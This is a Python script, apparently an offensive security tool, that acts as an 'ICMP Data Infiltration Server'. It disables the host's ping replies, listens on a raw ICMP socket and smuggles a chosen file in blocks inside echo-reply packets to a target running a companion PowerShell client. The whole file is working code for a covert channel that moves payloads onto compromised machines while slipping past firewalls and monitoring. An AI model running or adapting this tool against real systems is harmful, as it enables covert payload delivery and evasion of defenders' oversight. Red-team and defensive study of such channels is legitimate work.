#!/usr/bin/python3
#
# ICMP Data Infiltration Server
# Created by Matthew David (@icyguider)
# Heavily built off of Bernardo Damele's icmpsh tool

import os
import select
import socket
import sys
import argparse
from array import array

def disablePingReply():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "1":
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit()


def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)

def main(src, dst, filename, blockSize, verbose):
    disablePingReply()
    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('[!] You need to install Python Impacket library first\n')
        sys.exit(255)

    # Make standard input a non-blocking file
    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)

    # Open one socket for ICMP protocol
    # A special option is set on the socket so that IP headers are included
    # with the returned data
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error:
        sys.stderr.write('[!] You need to run this tool with administrator privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)

    # Create a new ICMP packet of type ECHO REPLY
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    # Instantiate an IP packets decoder
    decoder = ImpactDecoder.IPDecoder()

    #READ FILE FOR BYTES
    file = open(filename, "rb")
    fbytes = file.read()
    file.close()

    count = 0
    stop = False
    print("File %s is staged and ready to be downloaded." % filename)
    print("Load the PowerShell client on target and run: Invoke-IcmpDownload %s %s" % (src, filename))
    numOfBlocks = len(fbytes)/blockSize
    evenBlocks = False
    if numOfBlocks.is_integer():
        evenBlocks = True
    for i in range(0, len(fbytes), blockSize):
        successful = False
        endval = i + blockSize
        current = fbytes[i:endval]
        cmd = current
        count = count + 1

        # Wait for incoming replies
        while successful is False:
            if evenBlocks == False:
                if len(cmd) < blockSize:
                    stop = True
            else:
                if count == numOfBlocks:
                    stop = True
            timeout = 1
            if sock in select.select([ sock ], [], [], timeout)[0]:
                buff = sock.recv(4096)

                if 0 == len(buff):
                    # Socket remotely closed
                    sock.close()
                    sys.exit(0)

                if count == 1:
                    print("Transfering file to target, please wait...")

                # Packet received; decode it
                ippacket = decoder.decode(buff)
                icmppacket = ippacket.child()

                # If the packet matches, report it to the user
                if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                    # Get identifier and sequence number
                    ident = icmppacket.get_icmp_id()
                    seq_id = icmppacket.get_icmp_seq()
                    data = icmppacket.get_data_as_string()

                    if len(data) > 0:
                        sys.stdout.write(data)

                    if stop == False:
                        if verbose == True:
                            print("Sending Block: {}/{}".format(count, round(numOfBlocks)))
                        cmd = current

                        # Set sequence number and identifier
                        icmp.set_icmp_id(ident)
                        icmp.set_icmp_seq(seq_id)

                        # Include the command as data inside the ICMP packet
                        icmp.contains(ImpactPacket.Data(cmd))

                        # Calculate its checksum
                        icmp.set_icmp_cksum(0)
                        icmp.auto_checksum = 1

                        # Have the IP packet contain the ICMP packet (along with its payload)
                        ip.contains(icmp)

                        # Send it to the target host
                        sock.sendto(ip.get_packet(), (dst, 0))
                        successful = True

                    if stop == True:
                        cmd = current

                        # Set sequence number and identifier
                        icmp.set_icmp_id(ident)
                        icmp.set_icmp_seq(seq_id)

                        # Include the command as data inside the ICMP packet
                        icmp.contains(ImpactPacket.Data(cmd))

                        # Calculate its checksum
                        icmp.set_icmp_cksum(0)
                        icmp.auto_checksum = 1

                        # Have the IP packet contain the ICMP packet (along with its payload)
                        ip.contains(icmp)

                        # Send it to the target host
                        sock.sendto(ip.get_packet(), (dst, 0))

                        if sock in select.select([ sock ], [], [])[0]:
                            buff = sock.recv(4096)

                            if 0 == len(buff):
                                # Socket remotely closed
                                sock.close()
                                sys.exit(0)

                            # Packet received; decode and display it
                            ippacket = decoder.decode(buff)
                            icmppacket = ippacket.child()

                            # If the packet matches, report it to the user
                            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                                # Get identifier and sequence number
                                ident = icmppacket.get_icmp_id()
                                seq_id = icmppacket.get_icmp_seq()
                                data = icmppacket.get_data_as_string()

                                if len(data) > 0:
                                    sys.stdout.write(data)

                                cmd = array('b')
                                cmd.frombytes('done'.encode())
                                cmd.tobytes()
                                # Set sequence number and identifier
                                icmp.set_icmp_id(ident)
                                icmp.set_icmp_seq(seq_id)

                                # Include the command as data inside the ICMP packet
                                icmp.contains(ImpactPacket.Data(cmd))

                                # Calculate its checksum
                                icmp.set_icmp_cksum(0)
                                icmp.auto_checksum = 1

                                # Have the IP packet contain the ICMP packet (along with its payload)
                                ip.contains(icmp)

                                # Send it to the target host
                                sock.sendto(ip.get_packet(), (dst, 0))
                                print("File transfer completed")
                                successful = True
                                break


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ICYGUIDER\'S ICMP FILE DOWNLOAD SERVER')
    parser.add_argument("source", help="Public IP address of current host", type=str)
    parser.add_argument("destination", help="Public IP address of destination host", type=str)
    parser.add_argument("file", help="File to transfer over ICMP", type=str)
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbosely print progress')
    parser.add_argument('-b', '--block-size', dest='blockSize', help='Size of each block (Default: 1000)', metavar='1000', default='1000')
    if len(sys.argv) < 4:
        parser.print_help()
        sys.exit()
    args = parser.parse_args()
    main(args.source, args.destination, args.file, int(args.blockSize), args.verbose)
